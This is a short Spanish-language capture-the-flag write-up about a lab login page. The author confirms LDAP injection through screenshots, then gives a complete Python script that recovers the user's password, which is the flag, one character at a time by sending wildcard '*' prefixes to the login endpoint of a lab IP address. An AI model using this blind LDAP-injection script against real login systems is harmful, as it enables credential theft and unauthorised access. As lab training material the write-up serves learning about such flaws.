Entramos a la aplicación y tenemos solo un login con un mensagj de un posible usuario Reese. 

Al ver el login las posibles vulnerabilidades pueden ser SLQi, NoSQLi y LDAP injection.

<img width="1236" height="769" alt="image" src="https://github.com/user-attachments/assets/64a1dabd-b0ec-4aa2-a41e-95167f1cc8cb" />

Realizando pruebas vemos que si colocamos las siguientes credenciales podemos acceder y confirmar el LDAP injection

<img width="1476" height="462" alt="image" src="https://github.com/user-attachments/assets/479134a7-e03f-4498-95a9-b714d25a9810" />

Una vez iniciada la app vemos que nos nos brinda la flag por eso, infiero que es la contraseña del usuario actual  desarrollo:
```
#!/usr/bin/env python3

import requests
import sys
import string

HOST = "154.57.164.82:30338"
BASE_URL = f"http://{HOST}"
LOGIN_URL = f"{BASE_URL}/login"
USERNAME = "reese"

KNOWN_PREFIX = ""
CHARSET = list("qwertyuiopQWERTYUIOPasdfghjklASDFGHJKLzxcvbnmZXCVBNM_-[]} {1234567890")

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Origin": BASE_URL,
    "Referer": f"{LOGIN_URL}?message=Authentication%20failed",
    "Accept-Language": "en-US,en;q=0.9",
}


def try_password(password: str):
    """Returns (success: bool, resp) for a given password attempt."""
    data = {"username": USERNAME, "password": password}
    resp = requests.post(
        LOGIN_URL,
        data=data,
        headers=HEADERS,
        allow_redirects=False,
        timeout=10,
    )
    location = resp.headers.get("Location", "")
    success = resp.status_code == 302 and location == "/"
    return success, resp


def brute_force():
    found = KNOWN_PREFIX
    print(f"[*] Starting with known prefix: {found!r}")

    if found.endswith("}"):
        print(f"[+] Already complete: {found}")
        return found

    while True:
        progressed = False
        for c in CHARSET:
            if c == "}":
                candidate = found + c
            else:
                candidate = found + c + "*"
            success, resp = try_password(candidate)
            status = "OK " if success else "no "
            sys.stdout.write(f"\r[{status}] trying: {candidate!r}          ")
            sys.stdout.flush()

            if success:
                found = found + c
                print(f"\n[+] Confirmed next char -> {found!r}")
                progressed = True
                break

        if not progressed:
            print(f"\n[-] No character extended the password further. Stuck at: {found!r}")
            print("[-] Either the charset is missing a character, or this isn't a prefix-accepting oracle.")
            return None

        if found.endswith("}"):
            print(f"\n[+] FLAG FOUND: {found}")
            return found


if __name__ == "__main__":
    result = brute_force()
    if result:
        print(f"\nFinal password/flag: {result}")
    else:
        print("\nBrute force failed to complete.")
        sys.exit(1)

```
